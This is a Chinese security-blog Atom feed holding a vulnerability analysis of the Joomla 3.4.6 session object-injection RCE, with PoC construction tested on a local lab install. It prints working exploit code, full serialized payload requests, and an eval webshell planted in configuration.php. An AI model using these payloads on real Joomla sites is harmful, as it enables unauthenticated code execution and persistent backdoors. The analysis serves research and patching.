<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SecurityCN&#39;s blog</title>
  
  <subtitle>感谢您关注SecurityCN(微信公众号:securitycn),本号会发布一些个人学习及研究文章，包括但不限于漏洞分析、漏洞挖掘、代码审计、IOT安全、比赛、培训认证等</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.securityinfo.cn/"/>
  <updated>2019-10-10T02:04:09.187Z</updated>
  <id>https://www.securityinfo.cn/</id>
  
  <author>
    <name>扫码关注公众号(SecurityCN)</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造</title>
    <link href="https://www.securityinfo.cn/2019/10/09/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-Joomla-3-4-6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8CPoc%E6%9E%84%E9%80%A0/"/>
    <id>https://www.securityinfo.cn/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/</id>
    <published>2019-10-09T12:24:17.000Z</published>
    <updated>2019-10-10T02:04:09.187Z</updated>
    
    <content type="html"><![CDATA[<p><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/fd87976bb0347e8a60d5929c0cd96b58.jpg" alt></p><p>Author：Ja0k</p><h3 id="事件背景"><a href="#事件背景" class="headerlink" title="#事件背景"></a>#事件背景</h3><p>上周，意大利安全公司 Hacktive Security的研究员 Alessandro<br>Groppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。</p><p>在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。<br>另外本文较长，请耐心阅读！</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="#影响范围"></a>#影响范围</h3><p>Joomla 3.0.0 至 3.4.6</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="#漏洞复现"></a>#漏洞复现</h3><p>1.安装部署</p><p>下载： <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></p><p>浏览器访问 <a href="http://127.0.0.1/Joomla/3.4.6/installation/index.php" target="_blank" rel="noopener">http://127.0.0.1/Joomla/3.4.6/installation/index.php</a> 安装<br>注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现<br>安装成功<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2d4bdfef5893c614625d22200e420a74.png" alt></p><p><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/46fd8c6f736390b380364e6d307727ca.png" alt></p><p>2.Poc复现<br>Poc地址:<br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py</a></p><p>脚本利用</p><p><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/0aa0ffdb124bb25fa6993dccb7b203c3.png" alt></p><p>执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马</p><p><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/cccd2fb43f5e1de2656dafd06cbdc8e2.png" alt></p><p>可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接</p><p>caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功</p><p><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/deb907880fabab9ca9176b5a50d1d877.png" alt></p><h3 id="Exp攻击链分析"><a href="#Exp攻击链分析" class="headerlink" title="#Exp攻击链分析"></a>#Exp攻击链分析</h3><p>目前互联网上公开的Exp下载地址:<br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py</a><br>通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-02-03.png" alt></p><p><strong>1.获取Cookie</strong><br>代码:<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-03-02.png" alt><br>通过burpeuite抓到的请求包1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p><strong>2.获取csrf-token （关键步骤）</strong><br>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def get_token(url, cook):</span><br><span class="line">        token = &apos;&apos;</span><br><span class="line">        resp = requests.get(url, cookies=cook, proxies = PROXS)</span><br><span class="line">        html = BeautifulSoup(resp.text,&apos;html.parser&apos;)</span><br><span class="line">        # csrf token is the last input</span><br><span class="line">        for v in html.find_all(&apos;input&apos;):</span><br><span class="line">                csrf = v</span><br><span class="line">        csrf = csrf.get(&apos;name&apos;)</span><br><span class="line">        return csrf</span><br></pre></td></tr></table></figure><p>通过burpeuite抓到的请求包2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6;</span><br></pre></td></tr></table></figure><p>主要是从返回包中提取 csrftoken<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-13-45.png" alt></p><p>3.生成payload 这里有2个payload<br><strong>后门的payload</strong><br>代码:<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-06-44.png" alt><br>利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos;</span><br></pre></td></tr></table></figure><p><strong>反弹的payload</strong><br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-09-23.png" alt><br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-07-33.png" alt></p><p>4.发送带有写入webshell的请求<br>主要构造username,password,option,task,csrftoken等字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">def make_req(url , object_payload):</span><br><span class="line">        # just make a req with object</span><br><span class="line">        print_info(&apos;Getting Session Cookie ..&apos;)</span><br><span class="line">        cook = get_cook(url)</span><br><span class="line">        print_info(&apos;Getting CSRF Token ..&apos;)</span><br><span class="line">        csrf = get_token( url, cook)</span><br><span class="line"> </span><br><span class="line">        user_payload = &apos;\\0\\0\\0&apos; * 9</span><br><span class="line">        padding = &apos;AAA&apos; # It will land at this padding</span><br><span class="line">        working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos;</span><br><span class="line">        clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects</span><br><span class="line"> </span><br><span class="line">        inj_object = &apos;&quot;;&apos;</span><br><span class="line">        inj_object += object_payload</span><br><span class="line">        inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part</span><br><span class="line">        password_payload = padding + inj_object</span><br><span class="line">        params = &#123;</span><br><span class="line">            &apos;username&apos;: user_payload,</span><br><span class="line">            &apos;password&apos;: password_payload,</span><br><span class="line">            &apos;option&apos;:&apos;com_users&apos;,</span><br><span class="line">            &apos;task&apos;:&apos;user.login&apos;,</span><br><span class="line">            csrf :&apos;1&apos;</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">        print_info(&apos;Sending request ..&apos;)</span><br><span class="line">        resp  = requests.post(url, proxies = PROXS, cookies = cook,data=params)</span><br><span class="line">        return resp.text</span><br></pre></td></tr></table></figure><p>下面是通过Burpsuite抓包获取的写入webshell的请求包3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6/index.php/component/users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3</span><br><span class="line">Content-Length: 1136</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1</span><br></pre></td></tr></table></figure><p>5.连接webshell测试是否写入成功<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-16-05-03.png" alt><br>通过burpeuite抓到的请求包4：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /Joomla/3.4.6//configuration.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: python-requests/2.22.0</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 70</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="#漏洞分析"></a>#漏洞分析</h3><p>这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。</p><p><strong>1.溢出</strong><br>当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。</p><p>漏洞利用文件<br>‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。<br>由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’<em>’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-17-35-50.png" alt><br>当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（N</em>N）替换‘\0\0\0’，重构原始对象。<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-22-27-37.png" alt><br>这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。<br>如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。<br><strong>举个栗子</strong><br>比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象:  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot;</span><br></pre></td></tr></table></figure><p>当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小</span><br></pre></td></tr></table></figure><p>被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！<br>就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。<br>在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。</p><p><strong>2. 对象注入（反序列化）</strong>  (本部分参考PHITHON的博客)<br>CVE-2015-8562的Poc如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;4</span><br></pre></td></tr></table></figure><p>在这个执行链中，分别利用了如下类：<br>JDatabaseDriverMysqli<br>SimplePie</p><p><strong>2.1 JDatabaseDriverMysqli类</strong><br>我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;disconnect();</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    public function disconnect()</span><br><span class="line">    &#123;</span><br><span class="line">        // Close the connection.</span><br><span class="line">        if ($this-&gt;connection)</span><br><span class="line">        &#123;</span><br><span class="line">            foreach ($this-&gt;disconnectHandlers as $h)</span><br><span class="line">            &#123;</span><br><span class="line">                call_user_func_array($h, array( &amp;$this));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            mysqli_close($this-&gt;connection);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $this-&gt;connection = null;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用<strong>destruct，</strong>destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。</p><p>但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。</p><p>于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。</p><p>跟进init方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function init()</span><br><span class="line">    &#123;</span><br><span class="line">        // Check absolute bare minimum requirements.</span><br><span class="line">        if ((function_exists(&apos;version_compare&apos;) &amp;&amp; version_compare(PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) || !extension_loaded(&apos;xml&apos;) || !extension_loaded(&apos;pcre&apos;))</span><br><span class="line">        &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = array();</span><br><span class="line">            $this-&gt;multifeed_objects = array();</span><br><span class="line">            $cache = false;</span><br><span class="line"></span><br><span class="line">            if ($this-&gt;feed_url !== null)</span><br><span class="line">            &#123;</span><br><span class="line">                $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url);</span><br><span class="line">                // Decide whether to enable caching</span><br><span class="line">                if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);</span><br></pre></td></tr></table></figure><p>很明显，其中这两个call_user_func将是触发代码执行的元凶。</p><p>所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。</p><p><strong>2.2 SimplePie类</strong><br>默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：<br><img src="//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/2019-10-09-23-26-30.png" alt><br>而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。<br>P牛的Poc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð</span><br></pre></td></tr></table></figure><p>前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了<br>选择用file_put_contents函数写入一句话到configuration.php中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\\\&apos;test\\\&apos;])) eval($_POST[\\\&apos;test\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;;</span><br></pre></td></tr></table></figure><p>最终的对象如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAA&quot;;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:217:&quot;file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\&apos;ja0k\&apos;]))+eval($_POST[\&apos;ja0k\&apos;]);&apos;,+FILE_APPEND)+||+$a=&apos;http://wtf&apos;;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;s:6:&quot;return&quot;;s:102:</span><br></pre></td></tr></table></figure><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="#修复建议"></a>#修复建议</h3><p>更新至最新版本<br>官方地址<a href="https://downloads.joomla.org" target="_blank" rel="noopener">https://downloads.joomla.org</a></p><p><strong>代码及工具下载：</strong><br><a href="https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE" target="_blank" rel="noopener">https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE</a></p><p><strong>免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。</strong></p><p>参考：<br>[1].<a href="https://cxsecurity.com/issue/WLB-2019100045" target="_blank" rel="noopener">https://cxsecurity.com/issue/WLB-2019100045</a><br>[2].<a href="https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html</a><br>[3].<a href="https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;//securitycn.github.io/2019/10/09/漏洞分析-Joomla-3-4-6远程代码执行漏洞原理分析和Poc构造/fd87976bb0347e8a60d5929c0cd96b58.jpg&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;Author：
      
    
    </summary>
    
    
      <category term="技术" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="安全研究" scheme="https://www.securityinfo.cn/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
      <category term="Web安全" scheme="https://www.securityinfo.cn/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="漏洞分析" scheme="https://www.securityinfo.cn/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="对象注入" scheme="https://www.securityinfo.cn/tags/%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？</title>
    <link href="https://www.securityinfo.cn/2019/10/08/%E3%80%90%E4%B8%93%E6%A0%8F%E3%80%91Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%B3%BB%E5%88%971-%E4%BB%80%E4%B9%88%E6%98%AFfastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9F/"/>
    <id>https://www.securityinfo.cn/2019/10/08/【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？/</id>
    <published>2019-10-08T14:14:10.000Z</published>
    <updated>2019-10-09T02:26:37.781Z</updated>
    
